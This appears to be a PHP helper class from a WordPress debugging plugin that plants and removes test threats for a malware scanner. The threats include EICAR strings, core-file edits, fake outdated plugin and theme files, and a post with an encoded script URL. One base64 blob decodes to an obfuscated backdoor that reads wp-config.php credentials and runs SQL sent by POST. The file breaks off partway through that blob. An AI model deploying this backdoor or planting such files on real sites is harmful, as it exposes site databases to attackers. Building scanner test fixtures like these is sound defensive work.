<?php
/**
 * Jetpack Scan helper class.
 *
 * @package automattic/jetpack-debug-helper
 *
 * @phpcs:disable WordPress.PHP.DiscouragedPHPFunctions.obfuscation_base64_decode
 */

/**
 * Helps debug Scan
 */
class Scan_Helper {

	/**
	 * Associative array that defines which files to use for our threats.
	 *
	 * @var array<string>
	 */
	private $threats = array();

	/**
	 * Construction.
	 */
	public function __construct() {
		$upload_dir    = wp_upload_dir()['basedir'];
		$admin_dir     = str_replace( site_url() . '/', ABSPATH, admin_url() );
		$content_dir   = WP_CONTENT_DIR;
		$abs_dir       = ABSPATH;
		$this->threats = array(
			'eicar'                  => "$upload_dir/jptt_eicar.php",
			'suspicious_link'        => "$upload_dir/jptt_suspicious_link.php",
			'core_file_modification' => "{$admin_dir}index.php",
			'non_core_file'          => "{$admin_dir}non-core-file.php",
			'infected_file'          => "$content_dir/index.php",
			'fake_vulnerable_plugin' => "$content_dir/plugins/wp-super-cache.php",
			'fake_vulnerable_theme'  => "$content_dir/themes/twentyfifteen/style.css",
			'fuzzy_hash_file'        => "$content_dir/fuzzy.php",
			'wp_settings_file'       => "$abs_dir/wp-settings.php",
		);

		add_action( 'admin_menu', array( $this, 'register_submenu_page' ), 1000 );
		add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_scripts' ) );
	}

	/**
	 * Add submenu item.
	 */
	public function register_submenu_page() {
		add_submenu_page(
			'jetpack-debug-tools',
			'Scan Helper',
			'Scan Helper',
			'manage_options',
			'scan-helper',
			array( $this, 'render_ui' ),
			99
		);
	}

	/**
	 * Enqueue scripts!
	 *
	 * @param string $hook Page hook.
	 */
	public function enqueue_scripts( $hook ) {
		if ( str_starts_with( $hook, 'jetpack-debug_page_scan-helper' ) ) {
			wp_enqueue_style( 'scan_helper_style', plugin_dir_url( __FILE__ ) . 'inc/css/scan-helper.css', array(), JETPACK_DEBUG_HELPER_VERSION );
		}
	}

	/**
	 * Has Credentials
	 *
	 * @return bool
	 */
	private function has_credentials() {
		$url         = wp_nonce_url( 'admin.php?page=scan-helper', 'scan-helper-nonce' );
		$credentials = request_filesystem_credentials( $url );

		if ( false === $credentials ) {
			return false;
		}

		if ( ! WP_Filesystem( $credentials ) ) {
			request_filesystem_credentials( $url, '', true );
			return false;
		}

		return true;
	}

	/**
	 * Get contents of a file to an array using the WP Filesystem API
	 *
	 * @param string $file_path File path.
	 */
	private function get_contents_array( $file_path ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		return $wp_filesystem->get_contents_array( $file_path );
	}

	/**
	 * Get contents of a file as a string using the WP Filesystem API
	 *
	 * @param string $file_path File path.
	 */
	private function get_contents( $file_path ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		return $wp_filesystem->get_contents( $file_path );
	}

	/**
	 * Checks the existance of a file through the WP Filesystem API.
	 *
	 * @param string $file_path File path.
	 */
	private function wp_file_exists( $file_path ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		return $wp_filesystem->exists( $file_path );
	}

	/**
	 * Write File
	 *
	 * @param string $file File path.
	 * @param string $contents File contents.
	 */
	private function write_file( $file, $contents ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		// Create parent directory of the file if it does not already exist
		$parent_dir = dirname( $file );
		if ( ! $wp_filesystem->is_dir( $parent_dir ) ) {
			$wp_filesystem->mkdir( $parent_dir );
		}

		return $wp_filesystem->put_contents( $file, $contents, FS_CHMOD_FILE );
	}

	/**
	 * Delete File
	 *
	 * @param string $file File path.
	 */
	private function delete_file( $file ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		return $wp_filesystem->delete( $file, true );
	}

	/**
	 * Checks whether the EICAR threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function eicar_threat_exists() {
		return file_exists( $this->threats['eicar'] );
	}

	/**
	 * Generate EICAR threats.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_eicar_threat() {
		$eicar_patterns =
			"<?php\n\necho <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' ) . "\nHTML;\n" .
			"echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNVU1BJQ0lPVVMtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKg==' ) . "\nHTML;\n" .
			"echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNVU1BJQ0lPVVMtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKg==' ) . "\nHTML;\n" .
			"echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLU1FRElVTS1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gq' ) . "\nHTML;\n" .
			"echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLUNSSVRJQ0FMLUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' ) . "\nHTML;\n";

		if ( ! $this->write_file( $this->threats['eicar'], $eicar_patterns ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file {$this->threats['eicar']}." );

		}

		return "Successfully added EICAR threats to {$this->threats['eicar']}.";
	}

	/**
	 * Remove EICAR Threat
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_eicar_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['eicar'] );

		if ( ! $this->delete_file( $this->threats['eicar'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file $relative_file_path." );
		}

		return "Successfully removed EICAR threats from $relative_file_path.";
	}

	/**
	 * Checks whether the Suspicious Link threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function suspicious_link_threat_exists() {
		return file_exists( $this->threats['suspicious_link'] );
	}

	/**
	 * Generate suspicious link threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_suspicious_link_threat() {
		// phpcs:disable Generic.Strings.UnnecessaryStringConcat.Found
		if ( ! $this->write_file( $this->threats['suspicious_link'], "<?php\n \$url = 'https://example.com" . "/akismet-guaranteed-spam/'; \n" ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file {$this->threats['suspicious_link']}" );
		}

		return "Successfully added Suspicious Link threat to {$this->threats['suspicious_link']}";
	}

	/**
	 * Remove suspicious link threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_suspicious_link_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['suspicious_link'] );

		if ( ! $this->delete_file( $this->threats['suspicious_link'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file $relative_file_path." );

		}

		return "Successfully removed Suspicious Link threat from $relative_file_path.";
	}

	/**
	 * Checks whether the Core File Modification threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function core_file_modification_threat_exists() {
		$lines = file( $this->threats['core_file_modification'] );
		return $lines[ count( $lines ) - 1 ] === 'if ( true === false ) exit();';
	}

	/**
	 * Generate core file modification threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_core_file_modification_threat() {
		$lines = $this->get_contents_array( $this->threats['core_file_modification'] );

		// add the threat by modifying the file
		$lines[] = 'if ( true === false ) exit();';

		$success = $this->write_file( $this->threats['core_file_modification'], implode( '', $lines ) );
		if ( ! $success ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file {$this->threats['core_file_modification']}" );
		}

		return "Modified the core file: {$this->threats['core_file_modification']}";
	}

	/**
	 * Remove core file modification threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_core_file_modification_threat() {
		$lines = $this->get_contents_array( $this->threats['core_file_modification'] );

		if ( $lines[ count( $lines ) - 1 ] === 'if ( true === false ) exit();' ) {
			// eliminate the threat by removing the modification
			array_pop( $lines );
			$this->write_file( $this->threats['core_file_modification'], implode( '', $lines ) );
			return 'Removed the core modification threat.';
		}

		return new WP_Error( 'could-not-write', "Unable to write/remove threat from $this->threats['core_file_modification']" );
	}

	/**
	 * Checks whether the Non-Core File threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function non_core_file_threat_exists() {
		return file_exists( $this->threats['non_core_file'] );
	}

	/**
	 * Generate core file modification threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_non_core_file_threat() {
		if ( ! $this->write_file( $this->threats['non_core_file'], "<?php echo 'I am a bad file'; ?>" ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file {$this->threats['non_core_file']}" );
		}

		return "Successfully added a non-core file {$this->threats['non_core_file']} in a core directory.";
	}

	/**
	 * Remove non-core file threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_non_core_file_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['non_core_file'] );

		if ( ! $this->delete_file( $this->threats['non_core_file'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to remove Non-Core File threat from $relative_file_path." );
		}

		return "Successfully removed Non-Core File threat from $relative_file_path.";
	}

	/**
	 * Checks whether the Post DB threat currently exists on the site.
	 *
	 * @since 1.6.0 -- Return a WP_Post object when the post exists.
	 *
	 * @return WP_Post|bool
	 */
	private function post_db_threat_exists() {
		$query = new WP_Query(
			array(
				'post_type'              => 'post',
				'title'                  => 'Scan Tester Post',
				'post_status'            => 'all',
				'posts_per_page'         => 1,
				'no_found_rows'          => true,
				'ignore_sticky_posts'    => true,
				'update_post_term_cache' => false,
				'update_post_meta_cache' => false,
				'orderby'                => 'post_date ID',
				'order'                  => 'ASC',
			)
		);
		if ( ! empty( $query->post ) ) {
			return $query->post;
		}

		return false;
	}

	/**
	 * Generate post db threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_post_db_threat() {
		if ( $this->post_db_threat_exists() ) {
			return 'Scan tester post already exists.';
		}

		$post_id = wp_insert_post(
			array(
				'post_title'   => 'Scan Tester Post',
				'post_content' => 'This will trigger the db scanner <script>let url="' . base64_decode( 'Y2xhc3NpY3RyYWluZXJzb25saW5lLmNvbQ==' ) . '"</script>',
				'post_status'  => 'publish',
				'post_type'    => 'post',
			)
		);

		if ( ! $post_id || ! is_int( $post_id ) ) {
			return new WP_Error( 'could-not-write', 'Unable to create post.' );
		}

		return 'Successfully created a new Scan tester post.';
	}

	/**
	 * Remove post db threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_post_db_threat() {
		$post = $this->post_db_threat_exists();

		if ( ! $post ) {
			return 'Scan tester post does not exist.';
		}

		if ( ! wp_delete_post( $post->ID, true ) ) {
			return new WP_Error( 'could-not-write', 'Unable to remove post.' );
		}

		return 'Successfully removed the Scan tester post.';
	}

	/**
	 * Checks whether the Infected File threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function infected_file_threat_exists() {
		$lines = file( $this->threats['infected_file'] );
		return $lines[ count( $lines ) - 1 ] === 'HTML;';
	}

	/**
	 * Generate infected file threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_infected_file_threat() {
		$content = "echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' ) . "\nHTML;";
		if ( ! $this->write_file( $this->threats['infected_file'], $content, FILE_APPEND ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat from {$this->threats['infected_file']}" );
		}

		return "Successfully added infected file threat to {$this->threats['infected_file']}.";
	}

	/**
	 * Remove infected file threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_infected_file_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['infected_file'] );
		$lines              = file( $this->threats['infected_file'] );
		if ( ! $lines[ count( $lines ) - 1 ] === 'HTML;' ) {
			return 'Infected file does not exist.';
		}

		// eliminate the threat by removing the modification
		array_splice( $lines, count( $lines ) - 3, 3 );
		if ( ! $this->write_file( $this->threats['infected_file'], implode( '', $lines ) ) ) {
			return new WP_Error( 'could-not-write', "Unable to remove threat from $relative_file_path." );
		}

		return "Removed the infected file threat from: $relative_file_path";
	}

	/**
	 * Checks whether the fake vulnerable plugin currently exists on the site.
	 *
	 * @return bool
	 */
	private function fake_vulnerable_plugin_exists() {
		return file_exists( $this->threats['fake_vulnerable_plugin'] );
	}

	/**
	 * Generate fake vulnerable plugin.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_fake_vulnerable_plugin() {
		$content = base64_decode(
			'LyoKUGx1Z2luIE5hbWU6IFdQIFN1cGVyIENhY2hlClBsdWdpbiBVUkk6IGh0dHBzOi8vd29yZHByZXNzLm9yZy9wbHVnaW5zL3' .
			'dwLXN1cGVyLWNhY2hlLwpEZXNjcmlwdGlvbjogVmVyeSBmYXN0IGNhY2hpbmcgcGx1Z2luIGZvciBXb3JkUHJlc3MuClZlcnNpb246ID' .
			'EuNy4yCkF1dGhvcjogQXV0b21hdHRpYwpBdXRob3IgVVJJOiBodHRwczovL2F1dG9tYXR0aWMuY29tLwpMaWNlbnNlOiBHUEwyKwpMaW' .
			'NlbnNlIFVSSTogaHR0cHM6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9ncGwtMi4wLnR4dApUZXh0IERvbWFpbjogd3Atc3VwZXItY2FjaGUKKi8='
		);

		if ( ! $this->write_file( $this->threats['fake_vulnerable_plugin'], $content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat to {$this->threats['fake_vulnerable_plugin']}" );
		}

		return "Successfully added fake vulnerable plugin to {$this->threats['fake_vulnerable_plugin']}.";
	}

	/**
	 * Remove fake vulnerable plugin.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_fake_vulnerable_plugin() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['fake_vulnerable_plugin'] );

		if ( ! $this->delete_file( $this->threats['fake_vulnerable_plugin'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file $relative_file_path." );
		}

		return "Successfully removed fake vulnerable plugin $relative_file_path.";
	}

	/**
	 * Checks whether the fake vulnerable theme currently exists on the site.
	 *
	 * @return bool
	 */
	private function fake_vulnerable_theme_exists() {
		return file_exists( $this->threats['fake_vulnerable_theme'] );
	}

	/**
	 * Generate fake vulnerable theme.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_fake_vulnerable_theme() {
		$content = base64_decode(
			'LyoKVGhlbWUgTmFtZTogVHdlbnR5IEZpZnRlZW4KVGhlbWUgVVJJOiBodHRwczovL3dvcmRwcmVzcy5vcmcvdGhlbWVzL3R3ZW' .
			'50eWZpZnRlZW4vCkF1dGhvcjogdGhlIFdvcmRQcmVzcyB0ZWFtCkF1dGhvciBVUkk6IGh0dHBzOi8vd29yZHByZXNzLm9yZy8KRGVzY3' .
			'JpcHRpb246IE91ciAyMDE1IGRlZmF1bHQgdGhlbWUgaXMgY2xlYW4sIGJsb2ctZm9jdXNlZCwgYW5kIGRlc2lnbmVkIGZvciBjbGFyaX' .
			'R5LiBUd2VudHkgRmlmdGVlbidzIHNpbXBsZSwgc3RyYWlnaHRmb3J3YXJkIHR5cG9ncmFwaHkgaXMgcmVhZGFibGUgb24gYSB3aWRlIH' .
			'ZhcmlldHkgb2Ygc2NyZWVuIHNpemVzLCBhbmQgc3VpdGFibGUgZm9yIG11bHRpcGxlIGxhbmd1YWdlcy4gV2UgZGVzaWduZWQgaXQgdX' .
			'NpbmcgYSBtb2JpbGUtZmlyc3QgYXBwcm9hY2gsIG1lYW5pbmcgeW91ciBjb250ZW50IHRha2VzIGNlbnRlci1zdGFnZSwgcmVnYXJkbG' .
			'VzcyBvZiB3aGV0aGVyIHlvdXIgdmlzaXRvcnMgYXJyaXZlIGJ5IHNtYXJ0cGhvbmUsIHRhYmxldCwgbGFwdG9wLCBvciBkZXNrdG9wIG' .
			'NvbXB1dGVyLgpWZXJzaW9uOiAxLjEKTGljZW5zZTogR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgdjIgb3IgbGF0ZXIKTGljZW5zZS' .
			'BVUkk6IGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9ncGwtMi4wLmh0bWwKVGFnczogYmxhY2ssIGJsdWUsIGdyYXksIHBpbmssIH' .
			'B1cnBsZSwgd2hpdGUsIHllbGxvdywgZGFyaywgbGlnaHQsIHR3by1jb2x1bW5zLCBsZWZ0LXNpZGViYXIsIGZpeGVkLWxheW91dCwgcm' .
			'VzcG9uc2l2ZS1sYXlvdXQsIGFjY2Vzc2liaWxpdHktcmVhZHksIGN1c3RvbS1iYWNrZ3JvdW5kLCBjdXN0b20tY29sb3JzLCBjdXN0b2' .
			'0taGVhZGVyLCBjdXN0b20tbWVudSwgZWRpdG9yLXN0eWxlLCBmZWF0dXJlZC1pbWFnZXMsIG1pY3JvZm9ybWF0cywgcG9zdC1mb3JtYX' .
			'RzLCBydGwtbGFuZ3VhZ2Utc3VwcG9ydCwgc3RpY2t5LXBvc3QsIHRocmVhZGVkLWNvbW1lbnRzLCB0cmFuc2xhdGlvbi1yZWFkeQpUZX' .
			'h0IERvbWFpbjogdHdlbnR5ZmlmdGVlbgoKVGhpcyB0aGVtZSwgbGlrZSBXb3JkUHJlc3MsIGlzIGxpY2Vuc2VkIHVuZGVyIHRoZSBHUE' .
			'wuClVzZSBpdCB0byBtYWtlIHNvbWV0aGluZyBjb29sLCBoYXZlIGZ1biwgYW5kIHNoYXJlIHdoYXQgeW91J3ZlIGxlYXJuZWQgd2l0aC' .
			'BvdGhlcnMuCiov'
		);

		if ( ! $this->write_file( $this->threats['fake_vulnerable_theme'], $content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat to {$this->threats['fake_vulnerable_theme']}" );
		}

		// The theme also needs an index.php to be recognized as one by WordPress.
		$index_content = '<?php // Silence is golden.';
		if ( ! $this->write_file( dirname( $this->threats['fake_vulnerable_theme'] ) . '/index.php', $index_content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write index.php to {$this->threats['fake_vulnerable_theme']}" );
		}

		return "Successfully added fake vulnerable theme to {$this->threats['fake_vulnerable_theme']}.";
	}

	/**
	 * Remove fake vulnerable theme.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_fake_vulnerable_theme() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['fake_vulnerable_theme'] );

		$parent_dir = dirname( $this->threats['fake_vulnerable_theme'] );
		if ( ! $this->delete_file( $parent_dir ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file $relative_file_path." );
		}

		return "Successfully removed fake vulnerable theme $relative_file_path.";
	}

	/**
	 * Checks whether the fuzzy hash threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function fuzzy_hash_threat_exists() {
		return file_exists( $this->threats['fuzzy_hash_file'] );
	}

	/**
	 * Generate a fuzzy hash threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_fuzzy_hash_threat() {
		$content = base64_decode(
			'b2NWMUxzU0NSTQo8P3BocApkZWZpbmUoJ0VYVF9NWVNRTEknLCAnbXlzcWxpJyk7IGRlZmluZSgnRVhUX01ZU1FMJywgJ215c3FsJyk7IGRlZm' .
			'luZSgnQ09ORl9QQVNTV09SRF9IQVNIJywgJ2VkYjM2ZTNmOGRlZGJlZTY3YzdiMDQzOWVkMGU1YTY2Jyk7IGRlZmluZSgnVkVSU0lPTicsICcw' .
			'LjIuMicpOyBmdW5jdGlvbiByX2dldF9saWIoKSB7IGlmIChjbGFzc19leGlzdHMoJ215c3FsaScpKSB7IHJldHVybiBFWFRfTVlTUUxJOyB9IG' .
			'lmIChmdW5jdGlvbl9leGlzdHMoJ215c3FsX2Nvbm5lY3QnKSkgeyByZXR1cm4gRVhUX01ZU1FMOyB9IH0gZnVuY3Rpb24gcl9nZXRfY29uZmln' .
			'X3BhdGgoKSB7ICRzcDQ4NjcyYSA9IHJlYWxwYXRoKCcuJyk7ICRzcGIzZTg3NCA9IDA7IHdoaWxlICgkc3A0ODY3MmEgIT0gJy8nKSB7IGlmIC' .
			'hmaWxlX2V4aXN0cyhzcHJpbnRmKCclcy93cC1jb25maWcucGhwJywgJHNwNDg2NzJhKSkgJiYgZmlsZV9leGlzdHMoc3ByaW50ZignJXMvaW5k' .
			'ZXgucGhwJywgJHNwNDg2NzJhKSkgJiYgZmlsZV9leGlzdHMoc3ByaW50ZignJXMvd3Atc2V0dGluZ3MucGhwJywgJHNwNDg2NzJhKSkpIHsgcm' .
			'V0dXJuICRzcDQ4NjcyYTsgfSAkc3BiM2U4NzQrKzsgJHNwNDg2NzJhID0gcmVhbHBhdGgoc3RyX3JlcGVhdCgnLi4vJywgJHNwYjNlODc0KSk7' .
			'IH0gfSBmdW5jdGlvbiByX2dldF9jb25maWcoKSB7ICRzcDQ4NjcyYSA9IHJlYWxwYXRoKCcuJyk7ICRzcGIzZTg3NCA9IDA7IHdoaWxlICgkc3' .
			'A0ODY3MmEgIT0gJy8nKSB7IGZpbGVfcHV0X2NvbnRlbnRzKCdmbG9nLmxvZycsICRzcDQ4NjcyYSAuICcKJywgRklMRV9BUFBFTkQpOyBpZiAo' .
			'ZmlsZV9leGlzdHMoc3ByaW50ZignJXMvd3AtY29uZmlnLnBocCcsICRzcDQ4NjcyYSkpICYmIGZpbGVfZXhpc3RzKHNwcmludGYoJyVzL2luZG' .
			'V4LnBocCcsICRzcDQ4NjcyYSkpICYmIGZpbGVfZXhpc3RzKHNwcmludGYoJyVzL3dwLXNldHRpbmdzLnBocCcsICRzcDQ4NjcyYSkpKSB7ICRz' .
			'cDMwY2JiZCA9IGZpbGUoc3ByaW50ZignJXMvd3AtY29uZmlnLnBocCcsICRzcDQ4NjcyYSkpOyAkc3AzMGNiYmQgPSBwcmVnX2dyZXAoJy9kZW' .
			'ZpbmVkL2knLCBwcmVnX2dyZXAoJy9kZWZpbmV8dGFibGVfcHJlZml4L2knLCAkc3AzMGNiYmQpLCBQUkVHX0dSRVBfSU5WRVJUKTsgJHNwMzBj' .
			'YmJkID0gaW1wbG9kZSgnCicsICRzcDMwY2JiZCk7IGV2YWwoJHNwMzBjYmJkKTsgJHNwZTFhMjQ1ID0gJ3RhYmxlX3ByZWZpeCc7ICRzcGFmNW' .
			'EyZCA9IGV4cGxvZGUoJzonLCBEQl9IT1NUKTsgJHNwMTMwMTFmID0gYXJyYXlfc2hpZnQoJHNwYWY1YTJkKTsgJHNwNWU5NDIxID0gYXJyYXlf' .
			'c2hpZnQoJHNwYWY1YTJkKTsgJHNwNWU5NDIxID0gJHNwNWU5NDIxID8gJHNwNWU5NDIxIDogMzMwNjsgcmV0dXJuIGFycmF5KCdob3N0JyA9Pi' .
			'Akc3AxMzAxMWYsICdwb3J0JyA9PiAkc3A1ZTk0MjEsICdkYicgPT4gREJfTkFNRSwgJ3VzZXInID0+IERCX1VTRVIsICdwYXNzJyA9PiBEQl9Q' .
			'QVNTV09SRCwgJ3ByZWZpeCcgPT4gJHskc3BlMWEyNDV9LCAncGF0aCcgPT4gJHNwNDg2NzJhKTsgYnJlYWs7IH0gJHNwYjNlODc0Kys7ICRzcD' .
			'Q4NjcyYSA9IHJlYWxwYXRoKHN0cl9yZXBlYXQoJy4uLycsICRzcGIzZTg3NCkpOyB9IH0gZnVuY3Rpb24gcl9teXNxbF9jb25uZWN0KCRzcDMw' .
			'Y2JiZCkgeyAkc3AwZjIwN2YgPSBteXNxbF9jb25uZWN0KHNwcmludGYoJyVzOiVzJywgJHNwMzBjYmJkWydob3N0J10sICRzcDMwY2JiZFsncG' .
			'9ydCddKSwgJHNwMzBjYmJkWyd1c2VyJ10sICRzcDMwY2JiZFsncGFzcyddKTsgbXlzcWxfc2VsZWN0X2RiKCRzcDMwY2JiZFsnZGInXSwgJHNw' .
			'MGYyMDdmKTsgcmV0dXJuICRzcDBmMjA3ZjsgfSBmdW5jdGlvbiByX215c3FsaV9jb25uZWN0KCRzcDMwY2JiZCkgeyByZXR1cm4gbmV3IG15c3' .
			'FsaSgkc3AzMGNiYmRbJ2hvc3QnXSwgJHNwMzBjYmJkWyd1c2VyJ10sICRzcDMwY2JiZFsncGFzcyddLCAkc3AzMGNiYmRbJ2RiJ10sIGlzX251' .
			'bWVyaWMoJHNwMzBjYmJkWydwb3J0J10pID8gJHNwMzBjYmJkWydwb3J0J10gOiAzMzA2LCAhaXNfbnVtZXJpYygkc3AzMGNiYmRbJ3BvcnQnXS' .
			'kgPyAkc3AzMGNiYmRbJ3BvcnQnXSA6IG51bGwpOyB9IGZ1bmN0aW9uIHJfbXlzcWxfcXVlcnkoJHNwMzBjYmJkLCAkc3AwZjIwN2YsICRzcGUx' .
			'NDFhOCwgJHNwM2FjMWY1ID0gYXJyYXkoKSkgeyBpZiAoIWVtcHR5KCRzcDNhYzFmNSkpIHsgZm9yZWFjaCAoJHNwM2FjMWY1IGFzICRzcDkyZm' .
			'ExZiA9PiAkc3BkMzk5N2EpIHsgJHNwZTE0MWE4ID0gc3RyX3JlcGxhY2UoJHNwOTJmYTFmLCBteXNxbF9yZWFsX2VzY2FwZV9zdHJpbmcoJHNw' .
			'ZDM5OTdhLCAkc3AwZjIwN2YpLCAkc3BlMTQxYTgpOyB9IH0gJHNwMDQzODljID0gYXJyYXkoKTsgJHNwYTU5ZDI3ID0gbXlzcWxfcXVlcnkoJH' .
			'NwZTE0MWE4LCAkc3AwZjIwN2YpOyBpZiAoJHNwYTU5ZDI3KSB7IHdoaWxlICgkc3A5MDFhZmYgPSBteXNxbF9mZXRjaF9hc3NvYygkc3BhNTlk' .
			'MjcpKSB7ICRzcDA0Mzg5Y1tdID0gJHNwOTAxYWZmOyB9IHJldHVybiBhcnJheSgnc3VjY2VzcycgPT4gJHNwMDQzODljKTsgfSBlbHNlIHsgcm' .
			'V0dXJuIGFycmF5KCdlcnJvcicgPT4gc3ByaW50ZignJXMgOjogJXMnLCBteXNxbF9lcnJubygkc3AwZjIwN2YpLCBteXNxbF9lcnJvcigkc3Aw' .
			'ZjIwN2YpKSk7IH0gfSBmdW5jdGlvbiByX215c3FsaV9xdWVyeSgkc3AzMGNiYmQsICRzcDBmMjA3ZiwgJHNwZTE0MWE4LCAkc3AzYWMxZjUgPS' .
			'BhcnJheSgpKSB7IGlmICghZW1wdHkoJHNwM2FjMWY1KSkgeyBmb3JlYWNoICgkc3AzYWMxZjUgYXMgJHNwOTJmYTFmID0+ICRzcGQzOTk3YSkg' .
			'eyAkc3BlMTQxYTggPSBzdHJfcmVwbGFjZSgkc3A5MmZhMWYsICRzcDBmMjA3Zi0+cmVhbF9lc2NhcGVfc3RyaW5nKCRzcGQzOTk3YSksICRzcG' .
			'UxNDFhOCk7IH0gfSAkc3BhNTlkMjcgPSAkc3AwZjIwN2YtPnF1ZXJ5KCRzcGUxNDFhOCk7IGlmIChpc19vYmplY3QoJHNwYTU5ZDI3KSkgeyAk' .
			'c3AwNDM4OWMgPSBhcnJheSgpOyB3aGlsZSAoJHNwOTAxYWZmID0gJHNwYTU5ZDI3LT5mZXRjaF9hc3NvYygpKSB7ICRzcDA0Mzg5Y1tdID0gJH' .
			'NwOTAxYWZmOyB9IHJldHVybiBhcnJheSgnc3VjY2VzcycgPT4gJHNwMDQzODljKTsgfSBpZiAoJHNwYTU5ZDI3KSB7IHJldHVybiBhcnJheSgn' .
			'c3VjY2VzcycgPT4gdHJ1ZSk7IH0gZWxzZSB7IHJldHVybiBhcnJheSgnZXJyb3InID0+IHNwcmludGYoJyVzIDo6ICVzJywgJHNwMGYyMDdmLT' .
			'5lcnJubywgJHNwMGYyMDdmLT5lcnJvcikpOyB9IH0gZnVuY3Rpb24gcl91bm1hZ2ljKCkgeyBpZiAoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSkg' .
			'eyBmb3JlYWNoICgkX1BPU1QgYXMgJHNwOTJmYTFmID0+ICRzcGQzOTk3YSkgeyAkX1BPU1RbJHNwOTJmYTFmXSA9IHN0cmlwc2xhc2hlcygkc3' .
			'BkMzk5N2EpOyB9IH0gfSBmdW5jdGlvbiByX2FjdGlvbl9wcmVmaXgoKSB7ICRzcDMwY2JiZCA9IHJfZ2V0X2NvbmZpZygpOyBlY2hvICRzcDMw' .
			'Y2JiZFsncHJlZml4J107IH0gZnVuY3Rpb24gcl9hY3Rpb25fcXVlcnkoKSB7IHJfdW5tYWdpYygpOyAkc3AzMGNiYmQgPSByX2dldF9jb25maW' .
			'coKTsgJHNwMDUxMzJjID0gcl9nZXRfbGliKCk7ICRzcDNhYzFmNSA9IGpzb25fZGVjb2RlKCRfUE9TVFsnYmluZCddLCB0cnVlKTsgaWYgKGlz' .
			'c2V0KCRfUE9TVFsnZGVjb2RlJ10pKSB7ICRzcDYyN2EyYiA9IGFycmF5X21hcCgndHJpbScsIGV4cGxvZGUoJywnLCAkX1BPU1RbJ2RlY29kZS' .
			'ddKSk7IGZvcmVhY2ggKCRzcDYyN2EyYiBhcyAkc3AzNTU4NTUpIHsgaWYgKGlzc2V0KCRzcDNhYzFmNVskc3AzNTU4NTVdKSkgeyAkc3AzYWMx' .
